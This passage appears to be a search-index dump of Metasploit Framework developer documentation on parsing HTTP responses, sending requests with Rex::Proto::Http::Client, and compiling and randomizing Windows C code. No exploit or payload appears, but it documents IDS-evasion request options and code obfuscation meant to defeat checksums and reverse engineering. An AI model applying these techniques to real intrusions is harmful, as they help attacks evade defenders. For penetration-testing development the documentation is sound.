div id = \"french\" > Bonjour </ div > </ div > </ body > < html > Basic usage of #at If the #at method is used to find a DIV element: html = res . get_html_document greeting = html . at ( 'div' ) Then the greeting variable should be a Nokogiri::XML::Element object that gives us this block of HTML (again, because the #at method only returns the first result): < div class = \"greetings\" > < div id = \"english\" > Hello </ div > < div id = \"spanish\" > Hola </ div > < div id = \"french\" > Bonjour </ div > </ div > Grabbing an element from a specific element tree html = res . get_html_document greeting = html . at ( 'div//div' ) Then the greeting variable should give us this block of HTML: < div id = \"english\" > Hello </ div > Grabbing an element with a specific attribute Let's say I don't want the English Hello, I want the Spanish one. Then we can do: html = res . get_html_document greeting = html . at ( 'div[@id=\"spanish\"]' ) Grabbing an element with a specific text Let's say I only know there's a DIV element that says \"Bonjour\", and I want to grab it, then I can do: html = res . get_html_document greeting = html . at ( '//div[contains(text(), \"Bonjour\")]' ) Or let's say I don't know what element the word \"Bonjour\" is in, then I can be a little vague about this: html = res . get_html_document greeting = html . at ( '[text()*=\"Bonjour\"]' ) Basic usage of #search The #search method returns an array of elements. Let's say we want to find all the DIV elements, then here's how: html = res . get_html_document divs = html . search ( 'div' ) Accessing text When you have an element, you can always call the #text method to grab the text. For example: html = res . get_html_document greeting = html . at ( '[text()*=\"Bonjour\"]' ) print_status ( greeting . text ) The #text method can also be used as a trick to strip all the HTML tags: html = res . get_html_document print_line ( html . text ) The above will print: \"\\n\\nHello, World!\\n\\n\\n\\nHello\\nHola\\nBonjour\\n\\n\\n\" If you actually want to keep the HTML tags, then instead of calling #text, call #inner_html. Accessing attributes With an element, simply call #attributes. Walking a DOM tree Use the #next method to move on to the next element. Use the #previous method to roll back to the previous element. Use the #parent method to find the parent element. Use the #children method to get all the child elements. Use the #traverse method for complex parsing. Parsing XML To get the XML body from Rex::Proto::Http::Response, do: xml = res . get_xml_document The rest should be pretty similar to parsing HTML. Parsing JSON To get the JSON body from Rex::Proto::Http::Response, do: json = res . get_json_document References http://www.nokogiri.org/tutorials/parsing_an_html_xml_document.html https://github.com/rapid7/metasploit-framework/wiki/How-to-send-an-HTTP-request-using-Rex%3A%3AProto%3A%3AHttp%3A%3AClient https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient","title":"How to parse an HTTP response"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#getting-a-response","text":"To get a response, you can either use Rex::Proto::Http::Client , or the HttpClient mixin to make an HTTP request. If you are writing a module, you should use the mixin. The following is an example of using the #send_request_cgi method from HttpClient: res = send_request_cgi ({ 'uri' => '/index.php' }) The return value for res is a Rex::Proto::Http::Response object, but it's also possible you get a NilClass due to a connection/response timeout.","title":"Getting a response"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#getting-the-response-body","text":"With a Rex::Proto::Http::Response object, here's how you can retrieve the HTTP body: data = res . body If you want to get the raw HTTP response (including the response message/code, headers, body, etc), then you can simply do: raw_res = res . to_s However, in this documentation we are only focusing on res.body .","title":"Getting the response body"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#choosing-the-right-parser","text":"Format Parser HTML Nokogiri XML Nokogiri JSON JSON If the format you need to parse isn't on the list, then fall back to res.body .","title":"Choosing the right parser"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#parsing-html-with-nokogiri","text":"When you have a Rex::Proto::Http::Response with HTML in it, the method to call is: html = res . get_html_document This will give you a Nokogiri::HTML::Document, which allows you use the Nokogiri API. There are two common methods in Nokogiri to find elements: #at and #search. The main difference is that the #at method will only return the first result, while the #search will return all found results (in an array). Consider the following example as your HTML response: < html > < head > < title > Hello, World! </ title > </ head > < body > < div class = \"greetings\" > < div id = \"english\" > Hello </ div > < div id = \"spanish\" > Hola </ div > < div id = \"french\" > Bonjour </ div > </ div > </ body > < html > Basic usage of #at If the #at method is used to find a DIV element: html = res . get_html_document greeting = html . at ( 'div' ) Then the greeting variable should be a Nokogiri::XML::Element object that gives us this block of HTML (again, because the #at method only returns the first result): < div class = \"greetings\" > < div id = \"english\" > Hello </ div > < div id = \"spanish\" > Hola </ div > < div id = \"french\" > Bonjour </ div > </ div > Grabbing an element from a specific element tree html = res . get_html_document greeting = html . at ( 'div//div' ) Then the greeting variable should give us this block of HTML: < div id = \"english\" > Hello </ div > Grabbing an element with a specific attribute Let's say I don't want the English Hello, I want the Spanish one. Then we can do: html = res . get_html_document greeting = html . at ( 'div[@id=\"spanish\"]' ) Grabbing an element with a specific text Let's say I only know there's a DIV element that says \"Bonjour\", and I want to grab it, then I can do: html = res . get_html_document greeting = html . at ( '//div[contains(text(), \"Bonjour\")]' ) Or let's say I don't know what element the word \"Bonjour\" is in, then I can be a little vague about this: html = res . get_html_document greeting = html . at ( '[text()*=\"Bonjour\"]' ) Basic usage of #search The #search method returns an array of elements. Let's say we want to find all the DIV elements, then here's how: html = res . get_html_document divs = html . search ( 'div' ) Accessing text When you have an element, you can always call the #text method to grab the text. For example: html = res . get_html_document greeting = html . at ( '[text()*=\"Bonjour\"]' ) print_status ( greeting . text ) The #text method can also be used as a trick to strip all the HTML tags: html = res . get_html_document print_line ( html . text ) The above will print: \"\\n\\nHello, World!\\n\\n\\n\\nHello\\nHola\\nBonjour\\n\\n\\n\" If you actually want to keep the HTML tags, then instead of calling #text, call #inner_html. Accessing attributes With an element, simply call #attributes. Walking a DOM tree Use the #next method to move on to the next element. Use the #previous method to roll back to the previous element. Use the #parent method to find the parent element. Use the #children method to get all the child elements. Use the #traverse method for complex parsing.","title":"Parsing HTML with Nokogiri"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#parsing-xml","text":"To get the XML body from Rex::Proto::Http::Response, do: xml = res . get_xml_document The rest should be pretty similar to parsing HTML.","title":"Parsing XML"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#parsing-json","text":"To get the JSON body from Rex::Proto::Http::Response, do: json = res . get_json_document","title":"Parsing JSON"},{"location":"dev/dark/How-to-parse-an-HTTP-response/#references","text":"http://www.nokogiri.org/tutorials/parsing_an_html_xml_document.html https://github.com/rapid7/metasploit-framework/wiki/How-to-send-an-HTTP-request-using-Rex%3A%3AProto%3A%3AHttp%3A%3AClient https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient","title":"References"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/","text":"Note: This documentation may need to be vetted. How to send an HTTP request using Rex::Proto::Http::Client The Rex library (Ruby Extension Library) is the most fundamental piece of the Metasploit Framework architecture. Modules normally do not interact with Rex directly, instead they depend on the framework core and its mixins for better code sharing. If you are a Metasploit module developer, the lib/msf/core directory should be more than enough for most of your needs. If you are writing a module that speaks HTTP, then the Msf::Exploit::Remote::HttpClient mixin (which is found in lib/msf/core/exploit/http/client ) is most likely the one you want. However, in some scenarios, you actually can't use the HttpClient mixin. The most common is actually when writing a form-based login module using the LoginScanner API . If you find yourself in that situation, use Rex::Proto::Http::Client . Initializing Rex::Proto::Http::Client The Rex::Proto::Http::Client initializer creates a new HTTP client instance, and the most important piece is this: def initialize ( host , port = 80 , context = {}, ssl = nil , ssl_version = nil , proxies = nil , username = '' , password = '' ) As you can use, only the host argument is required, the rest are optional. But let's go over all of them right quick: Argument name Data type Description host String Target host IP port Fixnum Target host port context Hash Determines what is responsible for requesting that a socket can be created ssl Boolean True to enable it ssl_version String SSL2, SSL3, or TLS1 proxies String Configure a proxy username String Username for automatic authentication password String Password for automatic authentication Code example of initialing Rex::Proto::Http::Client: cli = Rex :: Proto :: Http :: Client . new ( rhost , rport , {}, true , 8181 , proxies , 'username' , 'password' ) Making an HTTP request Even though our main topic of this documentation is about Rex::Proto::Http::Client, it does not know how to make HTTP requests. Instead, Rex::Proto::Http::ClientRequest is actually the mother of all Metasploit's HTTP requests. So how does Rex::Proto::Http::ClientRequest give birth to an HTTP request? Well, you see son, it all begins when Rex::Proto::Http::Client asks for one with either the #request_cgi or the #request_raw method. The difference is that if #request_cgi is used, the request is meant to be CGI compatible, and in most cases this is what you want. If #request_raw is used, technically it means less options, less CGI compatible. A raw HTTP request supports the following options: Option/key name Data type Description query String Raw GET query string data String Raw POST data string uri String Raw URI string ssl Boolean True to use https://, otherwise http:// agent String User-Agent. Default is: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) method String HTTP method proto String Protocol version String Version vhost String Host header port Fixnum Port for the host header authorization String The authorization header cookie String The cookie header connection String The connection header headers Hash A hash of custom headers. Safer than raw_headers raw_headers String A string of raw headers ctype String Content type An example of using #request_raw's options: # cli is a Rex::Proto::Http::Client object req = cli . request_raw ({ 'uri' => '/test.php' , 'method' => 'POST' , 'data' => 'A=B' }) #request_cgi inherits all the above , and more: Option/key name Data type Description pad_get_params Boolean Enable padding for GET parameters pad_get_params_count Fixnum Number of random GET parameters. You also need pad_get_params for this vars_get Hash A hash of GET parameters encode_params Boolean Enable URI encoding for GET or POST parameters pad_post_params Boolean Enable padding for POST parameters pad_post_params_count Fixnum Number of random POST parameters. You also need pad_post_params for this An example of using one of #request_cgi options: # cli is a Rex::Proto::Http::Client object req = cli . request_cgi ({ 'uri' => '/test.php' , 'vars_get' => { 'param1' => 'value' , 'param2' => 'value' } }) Sending an HTTP request Here are examples of how to actually speak to an HTTP server with either #request_cgi or #request_raw: #request_cgi cli = Rex :: Proto :: Http :: Client . new ( rhost ), cli . connect req = cli . request_cgi ({ 'uri' => '/' }) res = cli . send_recv ( req ) cli . close #request_raw cli = Rex :: Proto :: Http :: Client . new ( rhost ), cli . connect req = cli . request_raw ({ 'uri' => '/' }) res = cli . send_recv ( req ) cli . close Configuring advanced options Evasion Options Rex::Proto::Http::Client also comes with its own collection of evasion options. You can set them either when you're asking Rex::Proto::Http::ClientRequest to make the HTTP request, or you can set them with a #set_config method. The main difference is that if you are using #set_config, you should make these options user-configurable. Option Data type Default Known configurable option encode_params Boolean true N/A encode Boolean false N/A uri_encode_mode String hex-normal HTTP::uri_encode_mode uri_encode_count Fixnum 1 N/A uri_full_url Boolean false HTTP::uri_full_url pad_method_uri_count Fixnum 1 HTTP::pad_method_uri_count pad_uri_version_count Fixnum 1 HTTP::pad_uri_version_count pad_method_uri_type String space HTTP::pad_method_uri_type pad_uri_version_type String space HTTP::pad_uri_version_type method_random_valid Boolean false HTTP::method_random_valid method_random_invalid Boolean false HTTP::method_random_invalid method_random_case Boolean false HTTP::method_random_case version_random_valid Boolean false N/A version_random_invalid Boolean false N/A version_random_case Boolean false N/A uri_dir_self_reference Boolean false HTTP::uri_dir_self_reference uri_dir_fake_relative Boolean false HTTP::uri_dir_fake_relative uri_use_backslashes Boolean false HTTP::uri_use_backslashes pad_fake_headers Boolean pad_fake_headers HTTP::pad_fake_headers pad_fake_headers_count Fixnum 16 HTTP::pad_fake_headers_count pad_get_params Boolean false HTTP::pad_get_params pad_get_params_count Boolean 8 HTTP::pad_get_params_count pad_post_params Boolean false HTTP::pad_post_params pad_post_params_count Fixnum 8 HTTP::pad_post_params_count uri_fake_end Boolean false HTTP::uri_fake_end uri_fake_params_start Boolean false HTTP::uri_fake_params_start header_folding Boolean false HTTP::header_folding chunked_size Fixnum 0 N/A NTLM Options HTTP authentication is automatic in Rex::Proto::Http::Client, and when it comes to the NTLM provider, it gets its own options. You MUST use the #set_config method to set them: Option Data type Default Known configurable option usentlm2_session Boolean true NTLM::UseNTLM2_session use_ntlmv2 Boolean true NTLM::UseNTLMv2 send_lm Boolean true NTLM::SendLM send_ntlm Boolean true NTLM::SendNTLM SendSPN Boolean true NTLM::SendSPN UseLMKey Boolean false NTLM::UseLMKey domain String WORKSTATION DOMAIN DigestAuthIIS Boolean true DigestAuthIIS Note: \"Known configuration options\" means there is a datastore option for it from HttpClient. If you can't use HttpClient, then you will have to consider register them yourself. URI Parsing Rex::Proto::Http::Client actually does not support URI parsing, so for URI format validation and normalization, you are on your own, and you should probably do it. For URI format validation, we recommend using Ruby's URI module. You can use HttpClient's # target_uri method as an example. For URI normalization, we recommend HttpClient's # normalize_uri method as an example. Full Example cli = Rex :: Proto :: Http :: Client . new ( rhost , rport , {}, ssl , ssl_version , proxies , user , pass ) cli . set_config ( 'vhost' => vhost , 'agent' => datastore [ 'UserAgent' ] , 'uri_encode_mode' => datastore [ 'HTTP::uri_encode_mode' ] , 'uri_full_url' => datastore [ 'HTTP::uri_full_url' ] , 'pad_method_uri_count' => datastore [ 'HTTP::pad_method_uri_count' ] , 'pad_uri_version_count' => datastore [ 'HTTP::pad_uri_version_count' ] , 'pad_method_uri_type' => datastore [ 'HTTP::pad_method_uri_type' ] , 'pad_uri_version_type' => datastore [ 'HTTP::pad_uri_version_type' ] , 'method_random_valid' => datastore [ 'HTTP::method_random_valid' ] , 'method_random_invalid' => datastore [ 'HTTP::method_random_invalid' ] , 'method_random_case' => datastore [ 'HTTP::method_random_case' ] , 'uri_dir_self_reference' => datastore [ 'HTTP::uri_dir_self_reference' ] , 'uri_dir_fake_relative' => datastore [ 'HTTP::uri_dir_fake_relative' ] , 'uri_use_backslashes' => datastore [ 'HTTP::uri_use_backslashes' ] , 'pad_fake_headers' => datastore [ 'HTTP::pad_fake_headers' ] , 'pad_fake_headers_count' => datastore [ 'HTTP::pad_fake_headers_count' ] , 'pad_get_params' => datastore [ 'HTTP::pad_get_params' ] , 'pad_get_params_count' => datastore [ 'HTTP::pad_get_params_count' ] , 'pad_post_params' => datastore [ 'HTTP::pad_post_params' ] , 'pad_post_params_count' => datastore [ 'HTTP::pad_post_params_count' ] , 'uri_fake_end' => datastore [ 'HTTP::uri_fake_end' ] , 'uri_fake_params_start' => datastore [ 'HTTP::uri_fake_params_start' ] , 'header_folding' => datastore [ 'HTTP::header_folding' ] , 'usentlm2_session' => datastore [ 'NTLM::UseNTLM2_session' ] , 'use_ntlmv2' => datastore [ 'NTLM::UseNTLMv2' ] , 'send_lm' => datastore [ 'NTLM::SendLM' ] , 'send_ntlm' => datastore [ 'NTLM::SendNTLM' ] , 'SendSPN' => datastore [ 'NTLM::SendSPN' ] , 'UseLMKey' => datastore [ 'NTLM::UseLMKey' ] , 'domain' => datastore [ 'DOMAIN' ] , 'DigestAuthIIS' => datastore [ 'DigestAuthIIS' ] ) cli . connect req = cli . request_cgi ({ 'uri' => '/' }) res = cli . send_recv ( req ) cli . close","title":"How to send an HTTP request using Rex Proto Http Client"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#how-to-send-an-http-request-using-rexprotohttpclient","text":"The Rex library (Ruby Extension Library) is the most fundamental piece of the Metasploit Framework architecture. Modules normally do not interact with Rex directly, instead they depend on the framework core and its mixins for better code sharing. If you are a Metasploit module developer, the lib/msf/core directory should be more than enough for most of your needs. If you are writing a module that speaks HTTP, then the Msf::Exploit::Remote::HttpClient mixin (which is found in lib/msf/core/exploit/http/client ) is most likely the one you want. However, in some scenarios, you actually can't use the HttpClient mixin. The most common is actually when writing a form-based login module using the LoginScanner API . If you find yourself in that situation, use Rex::Proto::Http::Client .","title":"How to send an HTTP request using Rex::Proto::Http::Client"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#initializing-rexprotohttpclient","text":"The Rex::Proto::Http::Client initializer creates a new HTTP client instance, and the most important piece is this: def initialize ( host , port = 80 , context = {}, ssl = nil , ssl_version = nil , proxies = nil , username = '' , password = '' ) As you can use, only the host argument is required, the rest are optional. But let's go over all of them right quick: Argument name Data type Description host String Target host IP port Fixnum Target host port context Hash Determines what is responsible for requesting that a socket can be created ssl Boolean True to enable it ssl_version String SSL2, SSL3, or TLS1 proxies String Configure a proxy username String Username for automatic authentication password String Password for automatic authentication Code example of initialing Rex::Proto::Http::Client: cli = Rex :: Proto :: Http :: Client . new ( rhost , rport , {}, true , 8181 , proxies , 'username' , 'password' )","title":"Initializing Rex::Proto::Http::Client"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#making-an-http-request","text":"Even though our main topic of this documentation is about Rex::Proto::Http::Client, it does not know how to make HTTP requests. Instead, Rex::Proto::Http::ClientRequest is actually the mother of all Metasploit's HTTP requests. So how does Rex::Proto::Http::ClientRequest give birth to an HTTP request? Well, you see son, it all begins when Rex::Proto::Http::Client asks for one with either the #request_cgi or the #request_raw method. The difference is that if #request_cgi is used, the request is meant to be CGI compatible, and in most cases this is what you want. If #request_raw is used, technically it means less options, less CGI compatible. A raw HTTP request supports the following options: Option/key name Data type Description query String Raw GET query string data String Raw POST data string uri String Raw URI string ssl Boolean True to use https://, otherwise http:// agent String User-Agent. Default is: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) method String HTTP method proto String Protocol version String Version vhost String Host header port Fixnum Port for the host header authorization String The authorization header cookie String The cookie header connection String The connection header headers Hash A hash of custom headers. Safer than raw_headers raw_headers String A string of raw headers ctype String Content type An example of using #request_raw's options: # cli is a Rex::Proto::Http::Client object req = cli . request_raw ({ 'uri' => '/test.php' , 'method' => 'POST' , 'data' => 'A=B' }) #request_cgi inherits all the above , and more: Option/key name Data type Description pad_get_params Boolean Enable padding for GET parameters pad_get_params_count Fixnum Number of random GET parameters. You also need pad_get_params for this vars_get Hash A hash of GET parameters encode_params Boolean Enable URI encoding for GET or POST parameters pad_post_params Boolean Enable padding for POST parameters pad_post_params_count Fixnum Number of random POST parameters. You also need pad_post_params for this An example of using one of #request_cgi options: # cli is a Rex::Proto::Http::Client object req = cli . request_cgi ({ 'uri' => '/test.php' , 'vars_get' => { 'param1' => 'value' , 'param2' => 'value' } })","title":"Making an HTTP request"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#sending-an-http-request","text":"Here are examples of how to actually speak to an HTTP server with either #request_cgi or #request_raw: #request_cgi cli = Rex :: Proto :: Http :: Client . new ( rhost ), cli . connect req = cli . request_cgi ({ 'uri' => '/' }) res = cli . send_recv ( req ) cli . close #request_raw cli = Rex :: Proto :: Http :: Client . new ( rhost ), cli . connect req = cli . request_raw ({ 'uri' => '/' }) res = cli . send_recv ( req ) cli . close","title":"Sending an HTTP request"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#configuring-advanced-options","text":"Evasion Options Rex::Proto::Http::Client also comes with its own collection of evasion options. You can set them either when you're asking Rex::Proto::Http::ClientRequest to make the HTTP request, or you can set them with a #set_config method. The main difference is that if you are using #set_config, you should make these options user-configurable. Option Data type Default Known configurable option encode_params Boolean true N/A encode Boolean false N/A uri_encode_mode String hex-normal HTTP::uri_encode_mode uri_encode_count Fixnum 1 N/A uri_full_url Boolean false HTTP::uri_full_url pad_method_uri_count Fixnum 1 HTTP::pad_method_uri_count pad_uri_version_count Fixnum 1 HTTP::pad_uri_version_count pad_method_uri_type String space HTTP::pad_method_uri_type pad_uri_version_type String space HTTP::pad_uri_version_type method_random_valid Boolean false HTTP::method_random_valid method_random_invalid Boolean false HTTP::method_random_invalid method_random_case Boolean false HTTP::method_random_case version_random_valid Boolean false N/A version_random_invalid Boolean false N/A version_random_case Boolean false N/A uri_dir_self_reference Boolean false HTTP::uri_dir_self_reference uri_dir_fake_relative Boolean false HTTP::uri_dir_fake_relative uri_use_backslashes Boolean false HTTP::uri_use_backslashes pad_fake_headers Boolean pad_fake_headers HTTP::pad_fake_headers pad_fake_headers_count Fixnum 16 HTTP::pad_fake_headers_count pad_get_params Boolean false HTTP::pad_get_params pad_get_params_count Boolean 8 HTTP::pad_get_params_count pad_post_params Boolean false HTTP::pad_post_params pad_post_params_count Fixnum 8 HTTP::pad_post_params_count uri_fake_end Boolean false HTTP::uri_fake_end uri_fake_params_start Boolean false HTTP::uri_fake_params_start header_folding Boolean false HTTP::header_folding chunked_size Fixnum 0 N/A NTLM Options HTTP authentication is automatic in Rex::Proto::Http::Client, and when it comes to the NTLM provider, it gets its own options. You MUST use the #set_config method to set them: Option Data type Default Known configurable option usentlm2_session Boolean true NTLM::UseNTLM2_session use_ntlmv2 Boolean true NTLM::UseNTLMv2 send_lm Boolean true NTLM::SendLM send_ntlm Boolean true NTLM::SendNTLM SendSPN Boolean true NTLM::SendSPN UseLMKey Boolean false NTLM::UseLMKey domain String WORKSTATION DOMAIN DigestAuthIIS Boolean true DigestAuthIIS Note: \"Known configuration options\" means there is a datastore option for it from HttpClient. If you can't use HttpClient, then you will have to consider register them yourself.","title":"Configuring advanced options"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#uri-parsing","text":"Rex::Proto::Http::Client actually does not support URI parsing, so for URI format validation and normalization, you are on your own, and you should probably do it. For URI format validation, we recommend using Ruby's URI module. You can use HttpClient's # target_uri method as an example. For URI normalization, we recommend HttpClient's # normalize_uri method as an example.","title":"URI Parsing"},{"location":"dev/dark/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/#full-example","text":"cli = Rex :: Proto :: Http :: Client . new ( rhost , rport , {}, ssl , ssl_version , proxies , user , pass ) cli . set_config ( 'vhost' => vhost , 'agent' => datastore [ 'UserAgent' ] , 'uri_encode_mode' => datastore [ 'HTTP::uri_encode_mode' ] , 'uri_full_url' => datastore [ 'HTTP::uri_full_url' ] , 'pad_method_uri_count' => datastore [ 'HTTP::pad_method_uri_count' ] , 'pad_uri_version_count' => datastore [ 'HTTP::pad_uri_version_count' ] , 'pad_method_uri_type' => datastore [ 'HTTP::pad_method_uri_type' ] , 'pad_uri_version_type' => datastore [ 'HTTP::pad_uri_version_type' ] , 'method_random_valid' => datastore [ 'HTTP::method_random_valid' ] , 'method_random_invalid' => datastore [ 'HTTP::method_random_invalid' ] , 'method_random_case' => datastore [ 'HTTP::method_random_case' ] , 'uri_dir_self_reference' => datastore [ 'HTTP::uri_dir_self_reference' ] , 'uri_dir_fake_relative' => datastore [ 'HTTP::uri_dir_fake_relative' ] , 'uri_use_backslashes' => datastore [ 'HTTP::uri_use_backslashes' ] , 'pad_fake_headers' => datastore [ 'HTTP::pad_fake_headers' ] , 'pad_fake_headers_count' => datastore [ 'HTTP::pad_fake_headers_count' ] , 'pad_get_params' => datastore [ 'HTTP::pad_get_params' ] , 'pad_get_params_count' => datastore [ 'HTTP::pad_get_params_count' ] , 'pad_post_params' => datastore [ 'HTTP::pad_post_params' ] , 'pad_post_params_count' => datastore [ 'HTTP::pad_post_params_count' ] , 'uri_fake_end' => datastore [ 'HTTP::uri_fake_end' ] , 'uri_fake_params_start' => datastore [ 'HTTP::uri_fake_params_start' ] , 'header_folding' => datastore [ 'HTTP::header_folding' ] , 'usentlm2_session' => datastore [ 'NTLM::UseNTLM2_session' ] , 'use_ntlmv2' => datastore [ 'NTLM::UseNTLMv2' ] , 'send_lm' => datastore [ 'NTLM::SendLM' ] , 'send_ntlm' => datastore [ 'NTLM::SendNTLM' ] , 'SendSPN' => datastore [ 'NTLM::SendSPN' ] , 'UseLMKey' => datastore [ 'NTLM::UseLMKey' ] , 'domain' => datastore [ 'DOMAIN' ] , 'DigestAuthIIS' => datastore [ 'DigestAuthIIS' ] ) cli . connect req = cli . request_cgi ({ 'uri' => '/' }) res = cli . send_recv ( req ) cli . close","title":"Full Example"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/","text":"How to use Metasploit::Framework::Compiler::Windows to compile C code Metasploit::Framework::Compiler::Windows is a wrapper of Metasm specifically for compiling C code for the Windows platform. The purpose of the wrapper is to support default headers, such as stdio.h , stdio.h , String.h , Windows.h , or some other important headers that you might use while writing in C. EXE Example c_template = %Q|#include <Windows.h> int main(void) { LPCTSTR lpMessage = \"Hello World\"; LPCTSTR lpTitle = \"Hi\"; MessageBox(NULL, lpMessage, lpTitle, MB_OK); return 0; }| require 'metasploit/framework/compiler/windows' # This will save the binary in variable exe exe = Metasploit :: Framework :: Compiler :: Windows . compile_c ( c_template ) # This will save the binary as a file Metasploit :: Framework :: Compiler :: Windows . compile_c_to_file ( '/tmp/test.exe' , c_template ) DLL Example c_template = %Q|#include <Windows.h> BOOL APIENTRY DllMain __attribute__((export))(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: MessageBox(NULL, \"Hello World\", \"Hello\", MB_OK); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } // This will be a function in the export table int Msg __attribute__((export))(void) { MessageBox(NULL, \"Hello World\", \"Hello\", MB_OK); return 0; } | require 'metasploit/framework/compiler/windows' dll = Metasploit :: Framework :: Compiler :: Windows . compile_c ( c_template , :dll ) To load a DLL, you can use the LoadLibrary API: #include <Windows.h> #include <stdio.h> int main ( void ) { HMODULE hMod = LoadLibrary ( \"hello_world.dll\" ); if ( hMod ) { printf ( \"hello_world.dll loaded \\n \" ); } else { printf ( \"Unable to load hello_world.dll \\n \" ); } } Or call the function in export with rundll32: rundll32 hell_world.dll,Msg Printf() Note that methods like printf() won't actually print anything, because it's not hooked up to stdout. If you want to use printf() for debugging purposes, you can consider using OutputDebugString , or MessageBox instead. Custom Headers Currently, the Metasm wrapper does not support custom headers from an arbitrary location. To work around this, you can place your headers in data/headers/windows , and then add that file name in lib/metasploit/framework/compiler/headers/windows.h . Code Randomization Metasploit::Framework::Compiler supports obfuscation that randomizes code at the source code level, and then compile. There are two methods we can use: Metasploit::Framework::Compiler::Windows.compile_random_c , or Metasploit::Framework::Compiler::Windows.compile_random_c_to_file . Using the last as an example: require 'msf/core' require 'metasploit/framework/compiler/windows' c_source_code = %Q| #include <Windows.h> int main() { const char* content = \"Hello World\"; const char* title = \"Hi\"; MessageBox(0, content, title, MB_OK); return 0; }| outfile = \"/tmp/helloworld.exe\" weight = 70 # This value is used to determine how random the code gets. Metasploit :: Framework :: Compiler :: Windows . compile_random_c_to_file ( outfile , c_source_code , weight : weight )","title":"How to use Metasploit::Framework::Compiler::Windows to compile C code"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/#how-to-use-metasploitframeworkcompilerwindows-to-compile-c-code","text":"Metasploit::Framework::Compiler::Windows is a wrapper of Metasm specifically for compiling C code for the Windows platform. The purpose of the wrapper is to support default headers, such as stdio.h , stdio.h , String.h , Windows.h , or some other important headers that you might use while writing in C.","title":"How to use Metasploit::Framework::Compiler::Windows to compile C code"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/#exe-example","text":"c_template = %Q|#include <Windows.h> int main(void) { LPCTSTR lpMessage = \"Hello World\"; LPCTSTR lpTitle = \"Hi\"; MessageBox(NULL, lpMessage, lpTitle, MB_OK); return 0; }| require 'metasploit/framework/compiler/windows' # This will save the binary in variable exe exe = Metasploit :: Framework :: Compiler :: Windows . compile_c ( c_template ) # This will save the binary as a file Metasploit :: Framework :: Compiler :: Windows . compile_c_to_file ( '/tmp/test.exe' , c_template )","title":"EXE Example"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/#dll-example","text":"c_template = %Q|#include <Windows.h> BOOL APIENTRY DllMain __attribute__((export))(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: MessageBox(NULL, \"Hello World\", \"Hello\", MB_OK); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } // This will be a function in the export table int Msg __attribute__((export))(void) { MessageBox(NULL, \"Hello World\", \"Hello\", MB_OK); return 0; } | require 'metasploit/framework/compiler/windows' dll = Metasploit :: Framework :: Compiler :: Windows . compile_c ( c_template , :dll ) To load a DLL, you can use the LoadLibrary API: #include <Windows.h> #include <stdio.h> int main ( void ) { HMODULE hMod = LoadLibrary ( \"hello_world.dll\" ); if ( hMod ) { printf ( \"hello_world.dll loaded \\n \" ); } else { printf ( \"Unable to load hello_world.dll \\n \" ); } } Or call the function in export with rundll32: rundll32 hell_world.dll,Msg","title":"DLL Example"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/#printf","text":"Note that methods like printf() won't actually print anything, because it's not hooked up to stdout. If you want to use printf() for debugging purposes, you can consider using OutputDebugString , or MessageBox instead.","title":"Printf()"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/#custom-headers","text":"Currently, the Metasm wrapper does not support custom headers from an arbitrary location. To work around this, you can place your headers in data/headers/windows , and then add that file name in lib/metasploit/framework/compiler/headers/windows.h .","title":"Custom Headers"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Compiler-Windows-to-compile-C-code/#code-randomization","text":"Metasploit::Framework::Compiler supports obfuscation that randomizes code at the source code level, and then compile. There are two methods we can use: Metasploit::Framework::Compiler::Windows.compile_random_c , or Metasploit::Framework::Compiler::Windows.compile_random_c_to_file . Using the last as an example: require 'msf/core' require 'metasploit/framework/compiler/windows' c_source_code = %Q| #include <Windows.h> int main() { const char* content = \"Hello World\"; const char* title = \"Hi\"; MessageBox(0, content, title, MB_OK); return 0; }| outfile = \"/tmp/helloworld.exe\" weight = 70 # This value is used to determine how random the code gets. Metasploit :: Framework :: Compiler :: Windows . compile_random_c_to_file ( outfile , c_source_code , weight : weight )","title":"Code Randomization"},{"location":"dev/dark/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/","text":"How to use Metasploit::Framework::Obfuscation::CRandomizer What is CRandomizer CRandomizer is an obfuscation feature in Metasploit Framework that allows you to randomize C code. It is done by injecting random statements such as native API calls, custom fake function calls, or other routines, etc. The CRandomizer is also supported by Metasploit Framework's code compiling API, which allows you to build a custom application that is unique (in terms of checksums), also harder to reverse-engineer. The randomness of the modification is based on a weight, an arbitrary number from 0 - 100. The higher the number, the more random the code gets. Components CRandomizer relies on Metasm to be able to 